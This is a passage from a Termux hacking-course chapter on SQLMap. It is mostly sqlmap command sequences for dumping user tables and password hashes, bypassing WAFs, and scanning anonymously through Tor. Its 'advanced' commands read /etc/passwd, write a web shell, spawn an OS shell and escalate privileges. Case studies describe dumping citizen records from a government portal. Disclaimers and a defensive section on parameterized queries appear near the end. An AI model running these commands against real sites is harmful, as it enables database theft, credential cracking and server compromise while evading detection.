       --cookie="id=1*; session=abc123" \
       -D webapp -T users --dump --batch
```

### Exercise 5: Blind SQL Injection Testing

```bash
# Task: Test time-based blind injection

# Step 1: Force time-based technique
sqlmap -u "http://localhost/page.php?id=1" \
       --technique=T \
       --batch

# Step 2: Adjust time threshold
sqlmap -u "http://localhost/page.php?id=1" \
       --technique=T \
       --time-sec=3 \
       --batch

# Step 3: Increase level for deeper testing
sqlmap -u "http://localhost/page.php?id=1" \
       --technique=T \
       --level=3 \
       --batch

# Step 4: Boolean-based testing
sqlmap -u "http://localhost/page.php?id=1" \
       --technique=B \
       --batch

# Step 5: Combined Boolean + Time
sqlmap -u "http://localhost/page.php?id=1" \
       --technique=BT \
       --batch
```

### Exercise 6: WAF Bypass Techniques

```bash
# Task: Bypass Web Application Firewall

# Step 1: Try without tamper
sqlmap -u "http://localhost/page.php?id=1" --batch

# Step 2: Use space2comment
sqlmap -u "http://localhost/page.php?id=1" \
       --tamper=space2comment \
       --batch

# Step 3: Multiple tampers
sqlmap -u "http://localhost/page.php?id=1" \
       --tamper=space2comment,between,randomcase \
       --batch

# Step 4: With random user-agent
sqlmap -u "http://localhost/page.php?id=1" \
       --tamper=space2comment \
       --random-agent \
       --batch

# Step 5: With delay to avoid rate limiting
sqlmap -u "http://localhost/page.php?id=1" \
       --tamper=space2comment \
       --delay=2 \
       --batch
```

### Exercise 7: Complete Database Enumeration

```bash
# Task: Full enumeration workflow

# Step 1: Fingerprint database
sqlmap -u "http://target.com/page?id=1" \
       --fingerprint \
       --batch

# Step 2: Get banner
sqlmap -u "http://target.com/page?id=1" \
       --banner \
       --batch

# Step 3: Current user
sqlmap -u "http://target.com/page?id=1" \
       --current-user \
       --batch

# Step 4: Check DBA privileges
sqlmap -u "http://target.com/page?id=1" \
       --is-dba \
       --batch

# Step 5: List databases
sqlmap -u "http://target.com/page?id=1" \
       --dbs \
       --batch

# Step 6: List tables in specific DB
sqlmap -u "http://target.com/page?id=1" \
       -D target_db --tables \
       --batch

# Step 7: Get columns
sqlmap -u "http://target.com/page?id=1" \
       -D target_db -T users --columns \
       --batch

# Step 8: Count records
sqlmap -u "http://target.com/page?id=1" \
       -D target_db -T users --count \
       --batch

# Step 9: Dump specific columns
sqlmap -u "http://target.com/page?id=1" \
       -D target_db -T users -C "username,password,email" --dump \
       --batch

# Step 10: Get passwords/hashes
sqlmap -u "http://target.com/page?id=1" \
       --passwords \
       --batch
```

---

## ⚠️ TROUBLESHOOTING

### Problem 1: SQLMap Not Found

```bash
# Cause: SQLMap not in PATH or alias not set

# Solution 1: Navigate to directory
cd ~/sqlmap
python sqlmap.py --version

# Solution 2: Create alias
echo 'alias sqlmap="python ~/sqlmap/sqlmap.py"' >> ~/.bashrc
source ~/.bashrc

# Solution 3: Full path
python ~/sqlmap/sqlmap.py -h

# Solution 4: Add to PATH
export PATH=$PATH:~/sqlmap
```

### Problem 2: Python Module Errors

```bash
# Cause: Missing Python dependencies

# Solution 1: Update pip
pip install --upgrade pip

# Solution 2: Install dependencies
pip install requests pyOpenSSL

# Solution 3: Reinstall SQLMap
rm -rf ~/sqlmap
git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git ~/sqlmap

# Solution 4: Check Python version
python --version
# Need Python 3.6 or higher
```

### Problem 3: No Injection Found

```bash
# Cause: No SQLi or detection failed

# Solution 1: Increase level
sqlmap -u "URL" --level=3 --batch

# Solution 2: Increase risk
sqlmap -u "URL" --risk=2 --batch

# Solution 3: Force specific technique
sqlmap -u "URL" --technique=T --batch  # Time-based
sqlmap -u "URL" --technique=B --batch  # Boolean-based

# Solution 4: Test specific parameter
sqlmap -u "URL?param1=1&param2=2" -p param1 --batch

# Solution 5: Check for WAF
sqlmap -u "URL" --identify-waf --batch

# Solution 6: Use tamper scripts
sqlmap -u "URL" --tamper=space2comment --batch

# Solution 7: Try all techniques
sqlmap -u "URL" --technique=BEUSTQ --level=5 --risk=3 --batch
```

### Problem 4: Connection Timeouts

```bash
# Cause: Slow network or server blocking

# Solution 1: Increase timeout
sqlmap -u "URL" --timeout=60 --batch

# Solution 2: Add delay between requests
sqlmap -u "URL" --delay=3 --batch

# Solution 3: Reduce threads
sqlmap -u "URL" --threads=1 --batch

# Solution 4: Use proxy to debug
sqlmap -u "URL" --proxy="http://127.0.0.1:8080" --batch

# Solution 5: Check URL accessibility
curl -I "URL"
```

### Problem 5: SSL/TLS Errors

```bash
# Cause: Certificate issues

# Solution 1: Ignore SSL errors
sqlmap -u "https://URL" --ignore-ssl-errors --batch

# Solution 2: Force SSL
sqlmap -u "http://URL" --force-ssl --batch

# Solution 3: Update certificates
pkg install ca-certificates
```

### Problem 6: Permission Denied / Access Denied

```bash
# Cause: Database user lacks privileges

# Solution 1: Try different enumeration
sqlmap -u "URL" --current-user --batch
sqlmap -u "URL" --is-dba --batch

# Solution 2: Focus on accessible data
sqlmap -u "URL" --tables --exclude-sysdbs --batch

# Solution 3: Try information_schema
sqlmap -u "URL" --schema --batch
```

### Problem 7: Session Issues

```bash
# Cause: Corrupted session data

# Solution 1: Flush session
sqlmap -u "URL" --flush-session --batch

# Solution 2: Purge all sessions
sqlmap --purge

# Solution 3: Fresh start
rm -rf ~/.sqlmap/output/*
sqlmap -u "URL" --batch
```

### Problem 8: WAF Blocking Requests

```bash
# Cause: Web Application Firewall

# Solution 1: Identify WAF
sqlmap -u "URL" --identify-waf --batch

# Solution 2: Use tamper scripts
sqlmap -u "URL" --tamper=space2comment,randomcase --batch

# Solution 3: Random User-Agent
sqlmap -u "URL" --random-agent --batch

# Solution 4: Add delays
sqlmap -u "URL" --delay=5 --batch

# Solution 5: Mobile User-Agent
sqlmap -u "URL" --mobile --batch

# Solution 6: Chunked encoding
sqlmap -u "URL" --chunked --batch
```

### Problem 9: Memory Issues

```bash
# Cause: Termux memory limits

# Solution 1: Reduce threads
sqlmap -u "URL" --threads=1 --batch

# Solution 2: Limit verbosity
sqlmap -u "URL" -v 1 --batch

# Solution 3: Clear cache
rm -rf ~/.sqlmap/output/*

# Solution 4: Use proot-distro for more resources
# See Chapter 49 for proot setup
```

### Problem 10: Output Not Saved

```bash
# Cause: Output directory issues

# Solution 1: Specify output directory
sqlmap -u "URL" --output-dir=/sdcard/sqlmap-output --batch

# Solution 2: Check default location
ls ~/.sqlmap/output/

# Solution 3: Save traffic
sqlmap -u "URL" -t traffic.txt --batch

# Solution 4: Redirect output
sqlmap -u "URL" --batch > output.txt 2>&1
```

---

## 🎬 VIDEO ASSETS

### Thumbnail Concepts

**Option A: Professional Style**
```
┌────────────────────────────────────┐
│  [Dark Terminal Background]        │
│                                    │
│   💉 SQLMAP BASICS                 │
│   SQL INJECTION TOOL               │
│                                    │
│   ✅ Auto Detection                │
│   ✅ Database Dump                 │
│   ✅ 25+ Commands                  │
│                                    │
│   [T3rmuxk1ng Logo]                │
└────────────────────────────────────┘
```

**Option B: Comparison Style**
```
┌────────────────────────────────────┐
│  Manual SQLi  ❌  SQLMap ✅        │
│  ─────────────┼──────────────────  │
│  Hours        │  Minutes           │
│  Complex      │  Automated         │
│  Error-prone  │  Accurate          │
│                                    │
│  TERMUX SQLMAP TUTORIAL            │
│  [T3rmuxk1ng]                      │
└────────────────────────────────────┘
```

**Option C: Eye-Catching**
```
┌────────────────────────────────────┐
│  🔥 HACK ANY DATABASE?             │
│                                    │
│  SQLMap makes it EASY!             │
│                                    │
│  📱 Termux Edition                 │
│  💀 Full Tutorial                  │
│                                    │
│  Chapter 34 | T3rmuxk1ng           │
└────────────────────────────────────┘
```

### Video Description Template

```markdown
💉 SQLMap Basics - SQL Injection Testing | Termux Full Course Chapter 34

🔥 In this video you'll learn:
• SQL Injection kya hai aur kaise kaam karta hai
• SQLMap ko Termux mein install karna
• Databases enumerate karna (--dbs, --tables, --columns)
• Data dump karna (--dump)
• POST aur Cookie injection testing
• WAF bypass techniques
• 25+ practical SQLMap commands

⏱️ Timestamps:
0:00 - Introduction
1:00 - SQL Injection Fundamentals
5:30 - SQLMap Introduction
8:00 - Installation in Termux
11:00 - Basic SQLMap Usage
15:00 - Database Enumeration
18:30 - Advanced Techniques
22:00 - Practice Targets
24:00 - Summary

📥 SQLMap Installation:
git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git
python sqlmap/sqlmap.py --version

📝 Key Commands:
sqlmap -u "URL" --dbs --batch
sqlmap -u "URL" --tables --batch
sqlmap -u "URL" --dump --batch

🎯 Practice Targets:
• DVWA (Damn Vulnerable Web Application)
• bWAPP
• SQLi Labs
• PortSwigger Web Security Academy

📚 Full Course Playlist:
[PLAYLIST LINK]

📱 Follow T3rmuxk1ng:
• YouTube: @T3rmuxk1ng
• Telegram: [LINK]
• GitHub: [LINK]

#SQLMap #SQLInjection #Termux #TermuxCourse #T3rmuxk1ng #EthicalHacking #WebSecurity #PenetrationTesting

---
⚠️ Disclaimer: This video is for educational purposes only. Always get proper authorization before testing any website or application. Unauthorized SQL injection testing is illegal and punishable by law.
```

### Tags List

```
sqlmap, sqlmap tutorial, sql injection, sqlmap termux, sqlmap hindi,
sql injection testing, database hacking, web penetration testing,
ethical hacking, cybersecurity, termux course, t3rmuxk1ng,
sqlmap basics, sqlmap commands, sql injection vulnerability,
blind sql injection, error based sql injection, union based sql injection,
database enumeration, sqlmap dump, sqlmap dbs tables columns,
web application security, owasp top 10, termux hacking,
android hacking, mobile penetration testing
```

### Hashtags

```
#SQLMap #SQLInjection #Termux #TermuxCourse #EthicalHacking 
#WebSecurity #PenetrationTesting #CyberSecurity #DatabaseHacking 
#T3rmuxk1ng #WebAppSecurity #OWASP #Infosec #BugBounty
```

---

## 📚 ADDITIONAL RESOURCES

### Official Resources

| Resource | Link |
|----------|------|
| SQLMap GitHub | https://github.com/sqlmapproject/sqlmap |
| SQLMap Wiki | https://github.com/sqlmapproject/sqlmap/wiki |
| OWASP SQL Injection | https://owasp.org/www-community/attacks/SQL_Injection |
| PortSwigger SQL Injection | https://portswigger.net/web-security/sql-injection |

### Practice Platforms

| Platform | Description |
|----------|-------------|
| DVWA | localhost practice app |
| bWAPP | Multiple vulnerabilities |
| SQLi Labs | SQL injection focused |
| HackTheBox | Real-world scenarios |
| TryHackMe | Guided learning paths |
| PortSwigger Academy | Free interactive labs |

### Learning Resources

| Resource | Type |
|----------|------|
| SQLMap User's Manual | Official documentation |
| OWASP Testing Guide | Comprehensive methodology |
| Web Application Hacker's Handbook | Book |
| PentesterLab | Hands-on exercises |

---

## ✅ CHAPTER CHECKLIST

Before moving to Chapter 35, verify:

- [ ] SQLMap installed successfully in Termux
- [ ] `sqlmap --version` shows correct version
- [ ] Basic scan completed on test target
- [ ] Database enumeration (--dbs) successful
- [ ] Table and column listing understood
- [ ] Data dump (--dump) tested
- [ ] POST request testing practiced
- [ ] Cookie injection tested
- [ ] Level and risk options understood
- [ ] Legal and ethical guidelines followed

---

## 🎯 NEXT CHAPTER PREVIEW

**Chapter 35: Metasploit Framework**

- Metasploit installation in Termux
- Exploit modules overview
- Payload types and selection
- Meterpreter sessions
- Post-exploitation commands
- Creating handlers
- Practical exploitation scenarios

---

**Chapter Complete! 🎉**

*Created by T3rmuxk1ng | Termux Full Course*

---

# 🚀 POWER UPGRADE - NEXT LEVEL CONTENT

---

## 🎮 INTERACTIVE QUIZ - Test Your Knowledge!

### SQL Injection & SQLMap Mastery Quiz

**Q1: What does SQL injection primarily target?**
- A) Network protocols
- B) Application databases ✓
- C) Operating system
- D) Web servers

**Q2: Which SQLMap flag enables non-interactive mode?**
- A) --auto
- B) --batch ✓
- C) --quiet
- D) --silent

**Q3: What type of SQL injection uses response time to extract data?**
- A) Error-based
- B) Union-based
- C) Time-based blind ✓
- D) Boolean-based blind

**Q4: Which flag is used to specify a target database in SQLMap?**
- A) --db
- B) -D ✓
- C) --database
- D) -d

**Q5: What is the purpose of the --tamper option in SQLMap?**
- A) To encrypt payloads
- B) To bypass WAF/firewalls ✓
- C) To speed up scanning
- D) To compress output

**Q6: Which technique code represents Union-based injection?**
- A) B
- B) E
- C) U ✓
- D) T

**Q7: What does the asterisk (*) mark in SQLMap cookie/header injection?**
- A) Wildcard character
- B) Injection point ✓
- C) Comment marker
- D) End of string

**Q8: Which SQLMap option lists all available databases?**
- A) --databases
- B) --list-dbs
- C) --dbs ✓
- D) --show-dbs

**Q9: What is the highest risk level in SQLMap?**
- A) 1
- B) 2
- C) 3 ✓
- D) 5

**Q10: Which command dumps data from a specific table?**
- A) sqlmap -u "URL" --download
- B) sqlmap -u "URL" -D db -T table --dump ✓
- C) sqlmap -u "URL" --extract
- D) sqlmap -u "URL" --get-data

**Q11: What does the --level parameter control?**
- A) Scan speed
- B) Number of payloads/tests ✓
- C) Output verbosity
- D) Thread count

**Q12: Which SQL injection type is considered most difficult to exploit?**
- A) Error-based
- B) Union-based
- C) Blind SQL injection ✓
- D) In-band injection

---

## 💡 PRO TIPS - Master SQLMap Like a Pro!

### Tip 1: Always Use Tor for Anonymous Scanning
```bash
# Install Tor
pkg install tor

# Start Tor service
tor &

# Run SQLMap through Tor
sqlmap -u "http://target.com/page?id=1" --tor --tor-type=SOCKS5 --batch
```

### Tip 2: Resume Interrupted Scans
```bash
# SQLMap saves progress automatically
# Resume with same command - it will restore session
sqlmap -u "http://target.com/page?id=1" --resume
```

### Tip 3: Use Multiple Tamper Scripts
```bash
# Combine multiple tampers for better WAF bypass
sqlmap -u "URL" --tamper=space2comment,between,randomcase --batch
```

### Tip 4: Optimize for Speed
```bash
# Increase threads for faster scanning (be careful!)
sqlmap -u "URL" --threads=10 --batch --level=1 --risk=1
```

### Tip 5: Use Request Files from Burp Suite
```bash
# Save request in Burp Suite -> Copy to file
# Run SQLMap with saved request
sqlmap -r burp_request.txt --batch --force-ssl
```

### Tip 6: Test All Parameters Automatically
```bash
# Test ALL parameters without specifying
sqlmap -u "URL" --all --batch
```

### Tip 7: Custom User-Agent Rotation
```bash
# Use random user-agent from file
sqlmap -u "URL" --user-agent="Mozilla/5.0 (Custom)" --batch
# Or use built-in random
sqlmap -u "URL" --random-agent --batch
```

### Tip 8: Second-Order SQL Injection Testing
```bash
# Test for second-order injection
sqlmap -u "URL" --second-url="http://target.com/profile" --batch
```

### Tip 9: Extract Specific Data Efficiently
```bash
# Only extract what you need - faster and stealthier
sqlmap -u "URL" -D db -T users -C "username,password,email" --dump --batch
```

### Tip 10: Check for Database Admin Privileges
```bash
# Check if current user is DBA
sqlmap -u "URL" --is-dba --batch
# If DBA, you can read/write files and execute commands!
```

---

## 🔥 REAL WORLD BUG BOUNTY CASES

### Case Study 1: E-commerce Platform SQL Injection

**Target:** Major e-commerce website with product search functionality

**Discovery Process:**
1. Identified search parameter vulnerable to SQL injection
2. Used SQLMap with level 3, risk 2
3. Found MySQL database backend
4. Enumerated 47 tables containing user data

**Payload:**
```bash
sqlmap -u "https://target.com/search?q=laptop" --level=3 --risk=2 \
       --random-agent --tor --dbs --batch
```

**Result:** $5,000 bounty for critical SQL injection leading to customer data exposure

**Lesson:** Never ignore search parameters - they're often vulnerable!

---

### Case Study 2: Authentication Bypass via SQL Injection

**Target:** Corporate login portal

**Discovery:**
```bash
# Found SQL injection in login form
sqlmap -u "https://target.com/login" \
       --data="username=admin&password=test" \
       -p username --technique=B --batch
```

**Findings:**
- Boolean-based blind injection
- Extracted admin password hash
- Cracked hash with SQLMap's built-in wordlist

**Reward:** $3,000 for authentication bypass vulnerability

---

### Case Study 3: Government Portal SQL Injection

**Target:** Government benefits application portal

**Attack Vector:**
```bash
sqlmap -u "https://portal.gov/app?id=1234" \
       --cookie="session=abc123; role=user" \
       --level=5 --risk=3 --batch \
       --tamper=charencode
```

**Impact:**
- Access to 100,000+ citizen records
- SSN, addresses, income data exposed
- Complete database dump possible

**Responsible Disclosure:** Reported through official security channel, received recognition and substantial reward.

---

## ⚡ QUICK REFERENCE CARD - SQLMap Commands

```
╔══════════════════════════════════════════════════════════════════════════╗
║                     SQLMAP QUICK REFERENCE CARD                           ║
╠══════════════════════════════════════════════════════════════════════════╣
║ TARGET OPTIONS                                                           ║
║ -u "URL"              Target URL                                          ║
║ -r request.txt        Load request from file                             ║
║ -g "dork"             Google dork results as targets                     ║
║ -l log.txt            Parse targets from Burp/WebScarab log             ║
╠══════════════════════════════════════════════════════════════════════════╣
║ ENUMERATION OPTIONS                                                      ║
║ --dbs                 List all databases                                 ║
║ --tables              List tables (-D database)                          ║
║ --columns             List columns (-D db -T table)                      ║
║ --dump                Dump table data                                    ║
║ --dump-all            Dump all tables                                    ║
║ --current-db          Current database name                              ║
║ --current-user        Current database user                              ║
║ --is-dba              Check if DBA privileges                            ║
║ --passwords           Enumerate password hashes                          ║
║ --privileges          Enumerate user privileges                          ║
╠══════════════════════════════════════════════════════════════════════════╣
║ TECHNIQUE OPTIONS                                                        ║
║ --technique=B         Boolean-based blind                                ║
║ --technique=E         Error-based                                        ║
║ --technique=U         Union-based                                        ║
║ --technique=T         Time-based blind                                   ║
║ --technique=S         Stacked queries                                    ║
╠══════════════════════════════════════════════════════════════════════════╣
║ INJECTION OPTIONS                                                        ║
║ -p parameter          Test specific parameter                            ║
║ --cookie="id=1*"      Cookie injection (* marks injection point)        ║
║ --headers="X-Forwarded-For: 127.0.0.1*"   Header injection              ║
║ --data="user=admin"   POST data injection                                ║
╠══════════════════════════════════════════════════════════════════════════╣
║ OPTIMIZATION OPTIONS                                                     ║
║ --threads=10          Concurrent threads                                 ║
║ --level=1-5           Test level (default 1)                             ║
║ --risk=1-3            Risk level (default 1)                             ║
║ --batch               Non-interactive mode                               ║
║ --random-agent        Random User-Agent                                  ║
╠══════════════════════════════════════════════════════════════════════════╣
║ WAF BYPASS OPTIONS                                                       ║
║ --tamper=space2comment    Space to /**/ bypass                          ║
║ --tamper=between          Replace > with NOT BETWEEN                     ║
║ --tamper=randomcase       Randomize case                                 ║
║ --tamper=charencode       URL encode                                     ║
╠══════════════════════════════════════════════════════════════════════════╣
║ FILE SYSTEM ACCESS                                                       ║
║ --file-read="/etc/passwd"   Read file                                    ║
║ --file-write="shell.php"    Write file                                   ║
║ --os-shell                  Get OS shell (if DBA)                        ║
╚══════════════════════════════════════════════════════════════════════════╝
```

---

## 🏆 BONUS CONTENT - Advanced SQLMap Exploitation

### Advanced Technique 1: OS Shell via SQL Injection

```bash
# If you have DBA privileges, you can get OS shell
sqlmap -u "URL" --os-shell --batch

# SQLMap will:
# 1. Upload web shell via database
# 2. Provide interactive shell access
```

### Advanced Technique 2: Reading Local Files

```bash
# Read files from server
sqlmap -u "URL" --file-read="/etc/passwd" --batch
sqlmap -u "URL" --file-read="/var/www/html/config.php" --batch
```

### Advanced Technique 3: Writing Web Shells

```bash
# Write web shell to web root
sqlmap -u "URL" --file-write="shell.php" \
       --file-dest="/var/www/html/shell.php" --batch
```

### Advanced Technique 4: Registry Access (Windows)

```bash
# Read Windows registry
sqlmap -u "URL" --reg-read \
       --reg-key="HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion" \
       --reg-value="ProductName" --batch
```

### Advanced Technique 5: Database Privilege Escalation

```bash
# Check for UDF (User Defined Function) injection
sqlmap -u "URL" --udf-inject --batch

# Privilege escalation via DLL injection on Windows
sqlmap -u "URL" --priv-esc --batch
```

### Advanced Technique 6: Automated Password Cracking

```bash
# SQLMap can crack hashes automatically
sqlmap -u "URL" --passwords --batch

# Use custom wordlist
sqlmap -u "URL" --passwords --wordlist=/path/to/wordlist.txt --batch
```

---

## 📝 CHAPTER SUMMARY - Key Takeaways

```
┌─────────────────────────────────────────────────────────────────────────┐
│                    CHAPTER 34 ESSENTIAL TAKEAWAYS                        │
├─────────────────────────────────────────────────────────────────────────┤
│                                                                          │
│  1. SQL Injection = Critical Web Vulnerability                           │
│     • OWASP Top 10 #3 position                                          │
│     • Can lead to complete database compromise                           │
│     • Types: In-band, Blind, Out-of-band                                │
│                                                                          │
│  2. SQLMap = Automated SQL Injection Tool                                │
│     • Supports MySQL, PostgreSQL, MSSQL, Oracle, SQLite                 │
│     • Automatic detection and exploitation                              │
│     • Free, open-source, cross-platform                                 │
│                                                                          │
│  3. Key Workflow                                                         │
│     • Detect injection → Enumerate → Extract → Escalate                 │
│     • Always use --batch for automation                                 │
│     • Start with low level/risk, increase as needed                     │
│                                                                          │
│  4. Essential Commands                                                   │
│     • sqlmap -u "URL" --dbs --batch                                     │
│     • sqlmap -u "URL" -D db -T table --dump --batch                     │
│     • sqlmap -r request.txt --batch                                     │
│                                                                          │
│  5. Legal & Ethical                                                      │
│     • Only test authorized targets                                      │
│     • Practice on DVWA, bWAPP, PortSwigger                              │
│     • Report vulnerabilities responsibly                                 │
│                                                                          │
└─────────────────────────────────────────────────────────────────────────┘
```

---

## 🛡️ DEFENSIVE SECURITY - Protecting Against SQL Injection

### Prevention Strategies for Developers

#### 1. Use Parameterized Queries (Prepared Statements)

**Vulnerable Code (PHP):**
```php
// BAD - Direct string concatenation
$query = "SELECT * FROM users WHERE id = " . $_GET['id'];
$result = mysqli_query($conn, $query);
```

**Secure Code:**
```php
// GOOD - Parameterized query
$stmt = $conn->prepare("SELECT * FROM users WHERE id = ?");
$stmt->bind_param("i", $_GET['id']);
$stmt->execute();
```

#### 2. Input Validation & Sanitization

```php
// Validate input type
if (!is_numeric($_GET['id'])) {
    die("Invalid ID");
}

// Use allow-list validation
$allowed_columns = ['name', 'email', 'phone'];
$column = in_array($_GET['sort'], $allowed_columns) ? $_GET['sort'] : 'name';
```

#### 3. Use ORM (Object-Relational Mapping)

```python
# SQLAlchemy - Safe by default
user = session.query(User).filter(User.id == user_id).first()

# Django ORM - Safe
user = User.objects.get(id=user_id)
```

#### 4. Principle of Least Privilege

```sql
-- Create application user with limited privileges
CREATE USER 'webapp'@'localhost' IDENTIFIED BY 'strong_password';
GRANT SELECT, INSERT, UPDATE ON webapp_db.* TO 'webapp'@'localhost';
-- Do NOT grant DROP, DELETE, or FILE privileges
```

#### 5. Web Application Firewall (WAF) Rules

```nginx
# ModSecurity WAF rule example
SecRule ARGS "@detectSQLi" \
    "id:1001,phase:2,deny,status:403,msg:'SQL Injection Detected'"
```

#### 6. Error Handling

```php
// Don't expose database errors to users
try {
    $result = $conn->query($query);
} catch (Exception $e) {
    error_log($e->getMessage());  // Log internally
    die("An error occurred. Please try again.");  // Generic message
}
```

### Security Testing Checklist

| Check | Status |
|-------|--------|
| All inputs validated? | ☐ |
| Parameterized queries used? | ☐ |
| Error messages sanitized? | ☐ |
| Database privileges limited? | ☐ |
| WAF rules configured? | ☐ |
| Regular security audits? | ☐ |
| Input length limits set? | ☐ |
| Stored procedures used where appropriate? | ☐ |

---

## 📋 METHODOLOGY - SQL Injection Attack Workflow

```
┌─────────────────────────────────────────────────────────────────────────┐
│                 SQL INJECTION TESTING METHODOLOGY                         │
├─────────────────────────────────────────────────────────────────────────┤
│                                                                          │
│  PHASE 1: RECONNAISSANCE                                                 │
│  ─────────────────────────                                               │
│  • Identify all input points (URL params, forms, cookies, headers)      │
│  • Map application structure and functionality                           │
│  • Identify technology stack (database type, web server, language)      │
│                                                                          │
│  PHASE 2: DETECTION                                                      │
│  ─────────────────────                                                   │
│  • Manual testing with payloads: ' " OR AND -- /*                       │
│  • Error message analysis                                                │
│  • Boolean condition testing                                             │
│  • Time-based testing                                                    │
│  • Automated scanning with SQLMap                                        │
│                                                                          │
│  PHASE 3: FINGERPRINTING                                                 │
│  ──────────────────────                                                  │
│  • Determine database type (MySQL, MSSQL, PostgreSQL, etc.)             │
│  • Identify database version                                             │
│  • Enumerate user privileges                                             │
│                                                                          │
│  PHASE 4: DATA EXTRACTION                                                │
│  ────────────────────────                                                │
│  • List databases → Tables → Columns → Data                             │
│  • Extract credentials and sensitive data                               │
│  • Document findings                                                     │
│                                                                          │
│  PHASE 5: POST-EXPLOITATION (If authorized)                              │
│  ────────────────────────────────────────                                │
│  • File read/write operations                                            │
│  • OS command execution                                                  │
│  • Privilege escalation                                                  │
│  • Lateral movement                                                      │
│                                                                          │
│  PHASE 6: REPORTING                                                      │
│  ─────────────────                                                       │
│  • Document all vulnerabilities                                          │
│  • Provide proof of concept                                              │
│  • Recommend remediation steps                                           │
│  • Responsible disclosure                                                │
│                                                                          │
└─────────────────────────────────────────────────────────────────────────┘
```

---

## ⚠️ LEGAL & ETHICS - Critical Guidelines

### Authorization Requirements

```
┌─────────────────────────────────────────────────────────────────────────┐
│                    LEGAL REQUIREMENTS                                    │
├─────────────────────────────────────────────────────────────────────────┤
│                                                                          │
│  ✅ ALWAYS GET WRITTEN AUTHORIZATION                                     │
│     • Signed contract or letter of authorization                        │
│     • Clearly defined scope of testing                                  │
│     • Time window for testing                                           │
│     • Emergency contact information                                     │
│                                                                          │
│  ❌ NEVER TEST WITHOUT PERMISSION                                        │
│     • Unauthorized testing is ILLEGAL                                   │
│     • Can result in criminal charges                                    │
│     • Civil lawsuits for damages                                        │
│     • Permanent criminal record                                         │
│                                                                          │
│  📋 BUG BOUNTY PROGRAMS                                                   │
│     • Read program rules carefully                                      │
│     • Stay within defined scope                                         │
│     • Don't test endpoints not in scope                                 │
│     • Report responsibly                                                │
│                                                                          │
└─────────────────────────────────────────────────────────────────────────┘
```

### Responsible Disclosure Timeline

```
Day 0    → Discover vulnerability
Day 0-1  → Document findings thoroughly
Day 1    → Report to vendor/organization privately
Day 1-7  → Wait for acknowledgment
Day 7-30 → Allow reasonable time for fix
Day 30   → Follow up if no response
Day 90   → Consider coordinated disclosure
         → Never exploit or share publicly before fix
```

### Legal Framework References

| Region | Law | Penalty |
|--------|-----|---------|
| USA | Computer Fraud and Abuse Act (CFAA) | Up to 10 years prison |
| India | IT Act Sections 43, 66, 66A | Up to 3 years prison + fine |
| EU | GDPR (data breach) | Up to €20M or 4% revenue |
| UK | Computer Misuse Act | Up to 10 years prison |

---

## 🔗 RELATED CHAPTERS - Cross-References

| Chapter | Topic | Relation |
|---------|-------|----------|
| Ch-25 | Nmap Network Scanning | Identify targets before SQL testing |
| Ch-35 | Metasploit Framework | Combine with SQL injection for exploitation |
| Ch-36 | PhoneSploit & ADB | Mobile app SQL injection testing |
| Ch-37 | Social Engineering Toolkit | Phishing for credentials + SQL injection |
| Ch-38 | WiFi Security Tools | Intercept SQL traffic on network |
| Ch-39 | Burp Suite | Manual SQL injection testing |
| Ch-40 | OWASP Top 10 | SQL injection is #3 in OWASP |
| Ch-41 | Web Application Penetration Testing | Complete web testing methodology |
| Ch-42 | Bug Bounty Hunting | SQL injection for bug bounty |
| Ch-43 | Penetration Testing Report | Document SQL injection findings |

### Skill Progression Path

```
SQLMap Basics (Ch-34)
        ↓
Manual SQL Injection Testing (Ch-39)
        ↓
Web Application Pen Testing (Ch-41)
        ↓
Bug Bounty Hunting (Ch-42)
        ↓
Advanced Database Exploitation
```

---

**🔥 CHAPTER 34 POWER UPGRADE COMPLETE! 🔥**

*Master SQLMap. Secure the Web. Hack Responsibly.*

